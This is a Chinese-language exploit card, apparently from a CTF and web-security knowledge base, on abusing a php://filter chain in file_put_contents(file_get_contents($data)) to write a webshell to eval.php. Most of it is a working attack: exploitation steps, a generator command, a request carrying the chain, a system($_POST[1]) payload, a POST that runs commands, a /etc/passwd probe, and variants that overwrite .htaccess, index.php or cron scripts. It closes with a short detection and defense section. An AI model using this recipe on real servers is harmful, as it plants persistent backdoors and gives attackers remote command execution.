---
id: web-php-file-inclusion-filter-chain-file-write-webshell
title: php://filter chain 写文件：file_put_contents(file_get_contents) 把生成内容落到 eval.php
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-filter-chain-file-write
aliases:
- filter chain 写 webshell
- file_put_contents filter chain
- php://filter resource 写文件
- filechain 落地
- eval.php 写入
- insph
tags:
- php
- filter-chain
- file-write
- webshell
- file-put-contents
- iconv
- rce
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:38+08:00'
  notes: 已对照原文核对：file_put_contents(file_get_contents) 读写同一可控路径、php_filter_chain_generator 生成链、resource 改为 eval.php 落盘并执行均一致；filter chain 依赖 PHP/iconv 版本；未在本机复跑。
---

## 一句话结论

当代码执行 `file_put_contents($data, file_get_contents($data))` 且 `$data` 可控时，把 `php://filter/.../resource=php://temp` 的末尾资源改成目标文件（如 `eval.php`），filter chain 生成的 PHP 代码会被 `file_get_contents` 产出、再由 `file_put_contents` 写回同一路径，从而在没有上传/包含点的情况下落地 WebShell。

## 原理

- **双向使用同一个可控路径**：`file_get_contents($data)` 读取 `$data`，`file_put_contents($data, ...)` 又写回 `$data`；若 `$data` 是 `php://filter/<chain>/resource=<target>`，读和写都经过同一条过滤链，目标资源就是 `<target>`。
- **filter chain 生成内容**：`convert.iconv.UTF8.CSISO2022KR` 等过滤器在空流上确定性注入字节，`convert.base64-decode` 丢弃非 Base64 字符做提纯，多次迭代可凭空构造任意字节；`php_filter_chain_generator` 可生成对应 `<chain>`。
- **从内存包含到落盘**：常规用法是 `resource=php://temp`，filter chain 的输出交给 `include` 在内存执行；把 resource 改成 `eval.php` 后，`file_get_contents` 的返回值（生成的 `<?=system($_POST[1]);?>`）被 `file_put_contents` 写到 `eval.php`，随后访问该文件即执行。
- **绕过内容检测**：上传接口可能拦截 `<?`、只允许 jpg/png/gif，或 `FileView` 过滤 `php://`、`..`、`flag` 等；但本入口的 `$data` 只被 `preg_match("/zip|phar|uploads/i")` 检查，不拦 `php://filter`，且写出的文件内容不在上传内容检查范围内。
- **前提**：`$data` 可控制；`allow_url_fopen`/filter 可用；目标目录可写；`file_put_contents` 能创建文件；filter chain 与 PHP/iconv 版本匹配。
- **与内存 RCE 的区别**：内存版依赖 `include` sink；本卡依赖“读写同一可控路径”的写 sink，最终危害是持久化 WebShell 而非一次性执行。

## 触发条件

- 应用存在 `file_put_contents($userInput, file_get_contents($userInput))` 或等价的“读写同一可控路径”代码。
- 用户输入未被协议白名单限制，允许 `php://filter`。
- 目标目录对 Web 进程可写，且写出的文件可被 Web 访问/执行（同目录或 Web 根）。
- 过滤链与目标 PHP/iconv 版本兼容；`file_put_contents` 未被 disable_functions 禁用。

## 利用步骤

1. 确认入口：请求 `?data=php://filter/convert.base64-encode/resource=/etc/passwd`，观察是否回显/处理，判断 `$data` 是否进入 `file_get_contents`。
2. 用 `php_filter_chain_generator.py --chain "<?=system(\$_POST[1]);?>"` 生成 filter chain。
3. 把生成链末尾的 `resource=php://temp` 改为 `resource=eval.php`（或当前目录下可访问的文件名）。
4. 发送 `?data=<整条链>`；`file_get_contents` 生成 PHP 代码，`file_put_contents` 写入 `eval.php`。
5. 访问 `http://target/eval.php`，POST `1=id` 验证命令执行。
6. 若目标目录不可写或文件名受限，换 `../` 路径、上传目录、缓存目录或已存在的可写文件。

## PoC

```bash
python3 php_filter_chain_generator.py --chain "<?=system(\$_POST[1]);?>" \
  | sed 's#resource=php://temp#resource=eval.php#'
```

```http
GET /?data=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=eval.php HTTP/1.1
Host: target
```

随后：

```http
POST /eval.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

1=id
```

文章实测：将 resource 改为 `eval.php` 后成功写入并执行，最终读取 flag。

## 变体与关联

- 变体：把目标改为 `.htaccess`、`index.php`、模板缓存、计划任务脚本；用 `php://filter/.../resource=php://temp` + `include` 走内存执行。
- 变体：若 `file_put_contents` 的第二个参数不可控，只控制第一个参数，可尝试 `php://filter` 的 write 链或 `data://` 写入。
- 变体：结合上传接口先放一个空文件/图片，再把 filter chain 写入该路径，绕过“文件必须存在”的限制。
- 关联：[[web-php-file-inclusion-filter-chain-fileless-rce]]（filter chain 内存包含 RCE）、[[web-php-file-inclusion-htaccess-auto-prepend-base64-filter]]（filter chain 组合 .htaccess）、[[web-php-rce-upload-chr-ascii-webshell-waf-bypass]]（WebShell 内容绕过）。

## 检测与防御

- 防御：禁止用户控制 `file_put_contents`/`file_get_contents` 的路径；对协议做白名单，只允许普通文件路径；禁止 `php://filter` 用于写。
- 防御：上传/写入目录不可执行 PHP，使用随机文件名，限制目录权限；关闭不必要的 iconv 编码转换。
- 检测：请求参数中出现 `php://filter`、`convert.iconv`、`resource=`；Web 目录出现新 PHP 文件；文件内容包含 `<?=`/`system` 等特征。
- 响应：删除写入的 WebShell，审计同目录文件，轮换凭据，修复读写同一可控路径的代码。
